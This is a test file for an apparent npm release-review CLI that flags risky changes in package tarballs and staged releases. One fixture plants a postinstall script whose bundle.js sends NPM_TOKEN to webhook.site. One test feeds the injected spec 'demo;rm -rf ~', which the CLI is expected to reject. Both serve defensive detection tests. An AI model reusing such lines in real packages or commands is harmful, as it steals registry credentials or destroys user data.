import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { cleanPackage, makeTarball } from './helpers.js';

// These tests run the built CLI (dist/cli.js); `npm test` builds first.
const CLI = join(import.meta.dirname, '..', 'dist', 'cli.js');
const FAKE_NPM = join(import.meta.dirname, 'fake-npm.mjs');
const STAGE_ID = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee';

let dir: string;
let tgz: Record<string, string>;

function setState(extra: Record<string, unknown> = {}): { log: string; state: string } {
  const log = join(dir, `log-${Math.random().toString(36).slice(2)}.txt`);
  writeFileSync(log, '');
  const state = join(dir, `state-${Math.random().toString(36).slice(2)}.json`);
  writeFileSync(
    state,
    JSON.stringify({
      log,
      packages: {
        demo: {
          versions: { '1.0.0': tgz.v100, '1.0.1': tgz.clean },
          tags: { latest: '1.0.1' },
          publishers: { '1.0.0': 'alice', '1.0.1': 'alice' },
        },
      },
      staged: [{ id: STAGE_ID, packageName: 'demo', version: '1.0.2', tag: 'latest', actor: 'github-actions', actorType: 'oidc', createdAt: '2026-10-11T10:00:00Z', tarball: tgz.worm }],
      packCwd: tgz.clean,
      ...extra,
    }),
  );
  return { log, state };
}

function run(args: string[], env: Record<string, string> = {}, cwd = dir) {
  const r = spawnSync(process.execPath, [CLI, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, STAGECHECK_NPM: FAKE_NPM, NO_COLOR: '1', GITHUB_STEP_SUMMARY: '', GITHUB_OUTPUT: '', ...env },
  });
  return { code: r.status, stdout: r.stdout, stderr: r.stderr };
}

const calls = (log: string): string[][] => readFileSync(log, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l) as string[]);

beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), 'stagecheck-cli-'));
  const write = (name: string, data: Buffer): string => {
    const p = join(dir, name);
    writeFileSync(p, data);
    return p;
  };
  tgz = {
    v100: write('demo-1.0.0.tgz', makeTarball(cleanPackage('1.0.0'))),
    clean: write('demo-1.0.1.tgz', makeTarball(cleanPackage('1.0.1', { 'CHANGELOG.md': '1.0.1: docs\n' }))),
    worm: write(
      'demo-1.0.2.tgz',
      makeTarball(cleanPackage('1.0.2', { 'bundle.js': "fetch('https://webhook.site/x', { body: process.env.NPM_TOKEN })\n" }, { scripts: { postinstall: 'node bundle.js' } })),
    ),
  };
});

afterAll(() => rmSync(dir, { recursive: true, force: true }));

describe('stagecheck review', () => {
  it('compares two tarballs', () => {
    const { state } = setState();
    const r = run(['review', tgz.v100 as string, tgz.clean as string], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('demo 1.0.0 → 1.0.1');
    expect(r.stdout).toContain('No red flags found');
  });

  it('exits 1 with --fail-on when the review finds problems', () => {
    const { state } = setState();
    const r = run(['review', tgz.clean as string, tgz.worm as string, '--fail-on', 'high'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(1);
    expect(r.stdout).toContain('adds a "postinstall" script');
    expect(r.stdout).toContain('webhook.site');
  });

  it('finds the previous published version for a single spec', () => {
    const { state, log } = setState();
    const r = run(['review', 'demo@1.0.1', '--format', 'json'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(0);
    expect(JSON.parse(r.stdout)).toMatchObject({ name: 'demo', from: '1.0.0', to: '1.0.1' });
    expect(calls(log)).toContainEqual(['pack', 'demo@1.0.0', '--silent']);
  });

  it('rejects unsafe specs and bad options', () => {
    const { state } = setState();
    expect(run(['review', 'demo;rm -rf ~'], { FAKE_NPM_STATE: state }).code).toBe(2);
    expect(run(['review', 'a', 'b', '--format', 'xml'], { FAKE_NPM_STATE: state }).stderr).toContain('--format');
    expect(run(['review', 'a', '--ignore', 'bad rule'], { FAKE_NPM_STATE: state }).code).toBe(2);
  });

  it('applies --ignore', () => {
    const { state } = setState();
    const r = run(['review', tgz.clean as string, tgz.worm as string, '--ignore', 'install-script', '--ignore', 'exfiltration-endpoint:bundle.js', '--ignore', 'credential-access:*.js', '--fail-on', 'high'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('3 findings ignored');
  });
});

describe('staged releases', () => {
  it('lists them', () => {
    const { state } = setState();
    const r = run(['list'], { FAKE_NPM_STATE: state });
    expect(r.stdout).toContain('demo@1.0.2 (latest)');
    expect(r.stdout).toContain(STAGE_ID);
  });

  it('reviews them against the published version without prompting when not in a terminal', () => {
    const { state, log } = setState();
    const r = run(['--format', 'json'], { FAKE_NPM_STATE: state });
    const review = JSON.parse(r.stdout);
    expect(review).toMatchObject({ name: 'demo', from: '1.0.1', to: '1.0.2', stagedBy: 'github-actions (oidc)' });
    expect(review.findings.map((f: { rule: string }) => f.rule)).toEqual(expect.arrayContaining(['install-script', 'exfiltration-endpoint', 'publisher-change']));
    expect(calls(log).some((c) => c[1] === 'approve')).toBe(false);
  });

  it('says so when nothing is staged', () => {
    const { state } = setState({ staged: [] });
    expect(run([], { FAKE_NPM_STATE: state }).stdout).toContain('No staged releases');
  });

  it('explains when npm is too old for staging', () => {
    const { state } = setState({ npmVersion: '10.9.4' });
    const r = run(['list'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(2);
    expect(r.stderr).toContain('npm 11.15 or newer');
  });
});

describe('stagecheck ci', () => {
  // The project in the working directory is demo@1.0.1; only 1.0.0 is on npm.
  const released = { packages: { demo: { versions: { '1.0.0': '' }, tags: { latest: '1.0.0' } } } };
  beforeAll(() => {
    released.packages.demo.versions['1.0.0'] = tgz.v100 as string;
  });

  it('reviews the packed project and writes a GitHub summary', () => {
    const { state } = setState(released);
    const summary = join(dir, 'summary.md');
    writeFileSync(summary, '');
    const r = run(['ci'], { FAKE_NPM_STATE: state, GITHUB_STEP_SUMMARY: summary });
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('demo 1.0.0 → 1.0.1');
    expect(readFileSync(summary, 'utf8')).toContain('### stagecheck: demo 1.0.0 → 1.0.1');
  });

  it('stages the reviewed tarball and prints how to approve it', () => {
    const { state, log } = setState(released);
    const summary = join(dir, 'summary2.md');
    const outputs = join(dir, 'outputs.txt');
    const r = run(['ci', '--stage-publish', '--summary', summary, '--', '--provenance', '--access', 'public'], { FAKE_NPM_STATE: state, GITHUB_OUTPUT: outputs });
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('Staged demo@1.0.1 with id 11111111-2222-4333-8444-555555555555');
    expect(readFileSync(outputs, 'utf8')).toBe('high=0\nmedium=0\nlow=0\nname=demo\nversion=1.0.1\nstage-id=11111111-2222-4333-8444-555555555555\n');
    const publish = calls(log).find((c) => c[0] === 'stage' && c[1] === 'publish');
    expect(publish?.[2]).toMatch(/package\.tgz$/);
    expect(publish?.slice(3)).toEqual(['--provenance', '--access', 'public']);
    expect(readFileSync(summary, 'utf8')).toContain('npm stage approve 11111111-2222-4333-8444-555555555555');
  });

  it("shows npm's reason when staging fails, not the log file path", () => {
    const stagePublishError = [
      'npm error code ENEEDAUTH',
      'npm error need auth This command requires you to be logged in to https://registry.npmjs.org/',
      'npm error need auth You need to authorize this machine using `npm adduser`',
      'npm error A complete log of this run can be found in: /Users/x/.npm/_logs/debug-0.log',
      '',
    ].join('\n');
    const { state } = setState({ ...released, stagePublishError });
    const r = run(['ci', '--stage-publish'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(2);
    expect(r.stderr).toContain('npm stage publish failed: ENEEDAUTH: need auth This command requires you to be logged in');
    expect(r.stderr).not.toContain('complete log');
  });

  it('refuses to stage a release with high-risk findings', () => {
    const { state, log } = setState({ packCwd: tgz.worm, packages: { demo: { versions: { '1.0.1': tgz.clean }, tags: { latest: '1.0.1' } } } });
    const r = run(['ci', '--stage-publish'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(1);
    expect(r.stderr).toContain('not staging demo@1.0.2');
    expect(calls(log).some((c) => c[1] === 'publish')).toBe(false);
  });

  it('reviews and stages a tarball you packed yourself, without packing again', () => {
    const { state, log } = setState(released);
    const r = run(['ci', tgz.clean as string, '--stage-publish'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('demo 1.0.0 → 1.0.1');
    expect(calls(log).some((c) => c[0] === 'pack' && c.includes('--pack-destination'))).toBe(false);
    expect(calls(log).find((c) => c[1] === 'publish')?.[2]).toBe(tgz.clean);
    expect(run(['ci', 'missing.tgz'], { FAKE_NPM_STATE: state }).stderr).toContain('No such tarball');
  });

  it('compares with the same version when it is already published', () => {
    const { state } = setState();
    const r = run(['ci'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('demo 1.0.1 → 1.0.1');
  });

  it('will not stage a version that is already published', () => {
    const { state, log } = setState();
    const r = run(['ci', '--stage-publish'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(2);
    expect(r.stderr).toContain('already on npm');
    expect(calls(log).some((c) => c[1] === 'publish')).toBe(false);
  });

  it('checks that npm supports staging before packing', () => {
    const { state, log } = setState({ ...released, npmVersion: '11.6.2' });
    const r = run(['ci', '--stage-publish'], { FAKE_NPM_STATE: state });
    expect(r.code).toBe(2);
    expect(r.stderr).toContain('npm 11.15 or newer');
    expect(calls(log).some((c) => c[0] === 'pack')).toBe(false);
  });

  it('treats an unpublished package as a first release', () => {
    const { state } = setState({ packages: {} });
    const r = run(['ci'], { FAKE_NPM_STATE: state });
    expect(r.stdout).toContain('demo 1.0.1 (first release)');
  });
});
